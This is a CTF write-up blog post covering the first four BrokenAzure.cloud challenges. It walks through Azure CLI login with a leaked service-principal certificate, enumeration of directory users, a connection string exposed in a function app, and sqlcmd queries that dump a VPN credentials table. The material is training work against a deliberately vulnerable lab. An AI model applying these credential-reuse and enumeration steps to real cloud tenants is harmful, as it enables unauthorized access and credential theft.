---
layout: post
title:  "BrokenAzure.cloud - A series of CTFs on Azure"
date:   2024-09-25 09:42:56 +0200
categories: ctf
---

## Table of Contents
1. [Introduction](#introduction)
2. [Examining the Webpage Source Code](#examining-the-webpage-source-code)
3. [Looking into `/header.html`](#looking-into-headerhtml)
4. [Azure Container Image Source URL](#azure-container-image-source-url)
5. [Flag 2](#flag-2)
6. [Flag 3](#flag-3)
7. [Flag 4](#flag-4)
8. [Conclusion](#conclusion)


## Introduction
Those are the first 4 challenges i took on [**BrokenAzure.cloud**](https://www.brokenazure.cloud/)

## Examining the Webpage Source Code
We examined the source code of the webpage that was presented to us:
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description"
        content="An online, open-source Azure CTF challenge called BrokenByDesign: Azure (BrokenAzure.cloud) that is running 24/7 created by Secura.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Azure Security training | challenge 1</title>
    <script src="inject_html.js" defer></script>
    <script src="main.js" defer></script>
    <link rel="stylesheet" href="/style.css">
</head>

<body class="container">
    <div class="content">
        <div include-html="/header.html"></div>

        <h2>
            What can I do with this app?
        </h2>
        <p>
            This app will test your hacking skills in the Azure cloud space.
        </p>
        <h2>
            How do I submit flags?
        </h2>
        <p>
            All flags have the format <strong>SECURA{CENSORED_FLAG}</strong>.
        </p>
        <h2>
            The Story
        </h2>
        <p>
            The company named SuperCompany B.V. has been working with IT systems for a while now and has an IT team of
            a whoppin' 2 people. Because the CEO of the company has heard that 'Cloud' is the new way of working, the CEO
            has asked the IT team to migrate all IT systems to the Azure cloud platform. Sadly, management does not allow
            the IT team to take courses or trainings to learn more about Azure cloud and so they have to learn as they go.
        </p>
        <h2>
            Get started!
        </h2>
        <input type="text" name="flag" id="flag" class="submit-flag-input" placeholder="Insert flag">
        <input type="button" value="Submit flag" class="submit-flag-button" id="submit-flag-button">
        <p>
            Need a hint? Click <a href="hint1.html">here</a>!
        </p>
        <div include-html="footer.html"></div>
    </div>
</body>

</html>
```
## Looking into `/header.html`.

```html
<img src="https://supercompanystorage.blob.core.windows.net/storagecontainer/logo.png" alt="Broken By Design logo"
    class="bbd-logo" onerror="loadingFailed()">
<h1 class="bbg-challenge-name">
    Azure
</h1>
<h3 id="missing-challenges" style="display:none;">
    We have noticed that you did not submit the flags for CHALLENGES_HERE. Don't worry, this is not a problem, but feel
    free to submit THEM now anyway!
</h3>
<h2>
    CHALLENGE_NR HINT_NR
</h2>
<!-- This is a horrible solution, but this way we start checking for the missing challenges when the header is loaded -->
<img src="" onerror="checkForMissing()" />
```


## Azure Container Image Source URL
We listed the container using the available APIs from Azure.
Flag found:
![8db552be41e65be690f464ada3898851.png](/assets/brokenAzure.cloud/8db552be41e65be690f464ada3898851.png)

### Flag 2:
![b6fa3141fe4b8118ccc4afe6500079ab.png](/assets/brokenAzure.cloud/b6fa3141fe4b8118ccc4afe6500079ab.png)

We downloaded .pem and .ovpn files from the previous challenge container and used them to log into Azure.
```
──(kali㉿kali)-[/home/kali]
└─PS> az login --service-principal --username 8f2b67d8-6501-4a47-9e6b-951363b2588a --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password /tmp/SECURA{CENSORED_FLAG}.pem --allow-no-subscriptions
[
  {
    "cloudName": "AzureCloud",
    "id": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "isDefault": true,
    "name": "N/A(tenant level account)",
    "state": "Enabled",
    "tenantId": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "user":```json
    "user": {
      "name": "8f2b67d8-6501-4a47-9e6b-951363b2588a",
      "type": "servicePrincipal"
    }
  }
]
```

Once inside Azure, we started doing some enumeration and listing the users. We found the flag in the office location of the first user.

![6ec6facf124a3d8ffdaf566e81787542.png](/assets/brokenAzure.cloud/6ec6facf124a3d8ffdaf566e81787542.png)

```bash
┌──(kali㉿kali)-[/home/kali]
└─PS> az ad user list                                                                                                          [                                                                                                                              
  {
    "businessPhones": [],
    "displayName": "DevOps",
    "givenName": null,
    "id": "022398e7-876f-4842-a598-706483ca4e98",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "Password temp changed to SECURA{D4F4ULT_P4SSW0RD}",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "devops@secvulnapp.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "Roy Stultiens | Secura",
    "givenName": null,
    "id": "8f54f6b2-1291-4791-85e7-163a72302888",
    "jobTitle": null,
    "mail": "roy.stultiens@secura.com",
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "roy.stultiens_secura.com#EXT#@secvulnapp.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "Roy Stultiens",
    "givenName": null,
    "id": "41cfff23-c2c2-49c2-a8a9-abc0642dc8c5",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null, 
	
	[...]
```

Flag found, with credentials to log in as the DevOps user.

## Flag 3
I logged into the Azure portal using the credentials found previously.

![fe3196c1a2219bc2702a4478b098baf7.png](/assets/brokenAzure.cloud/fe3196c1a2219bc2702a4478b098baf7.png)

We started doing some enumeration on the cloud and found some function apps.

![a73fa3003cc58be18428eab2bc17bb20.png](/assets/brokenAzure.cloud/a73fa3003cc58be18428eab2bc17bb20.png)

We started reading the function app code:
![52149997d27cdc8676372eceb7615bec.png](/assets/brokenAzure.cloud/52149997d27cdc8676372eceb7615bec.png)


```csharp
#r "Newtonsoft.Json"

using System.Net;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Primitives;
using Newtonsoft.Json;

public static async Task<IActionResult> Run(HttpRequest req, ILogger log)
{
    return new OkObjectResult("Server=tcp:securavulnerableserver.database.windows.net,1433;Initial Catalog=securavulnerabledb;Persist Security Info=False;User ID=DevOps;Password=SECURA{CENSORED_FLAG};MultipleActiveResultSets=False;Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;");
}
```

The flag is the password inside the connection string.

## Flag 4
We used the credentials previously found to connect to the database.

```bash
┌──(root㉿kali)-[/home/kali]
└─# sqlcmd -S securavulnerableserver.database.windows.net -d securavulnerabledb -U DevOps -P SECURA{CENSORED_FLAG};
1>
```

We started wandering around the database:

![0118682403e836dbabde49222fbe7861.png](/assets/brokenAzure.cloud/0118682403e836dbabde49222fbe7861.png)

```
┌──(root㉿kali)-[/home/kali]
└─# sqlcmd -S securavulnerableserver.database.windows.net -d securavulnerabledb -U DevOps -P SECURA{CENSORED_FLAG};
1> SELECT TABLE_NAME
2> FROM INFORMATION_SCHEMA.TABLES
3> WHERE TABLE_TYPE = 'BASE TABLE';
4> GO
TABLE_NAME                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
vpn_employee_data                                                                                                               

(1 row affected)
1> Select * from vpn_employee_data;
2> GO
vpn_username                                                                                                                                                                                                                                                    vpn_password                                                                                                                                                                                                                                                   
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Employee23187                                                                                                                                                                                                                                                   SECURA{CENSORED_FLAG}                                                                                                                                                                                                                                        

(1 row affected)
1>
```

Last Flag found.

## Conclusion
In this write-up, we explored the first four challenges presented on the BrokenAzure.cloud platform. Each challenge required different techniques and methodologies to uncover the flags, demonstrating the importance of understanding Azure's security features and vulnerabilities.
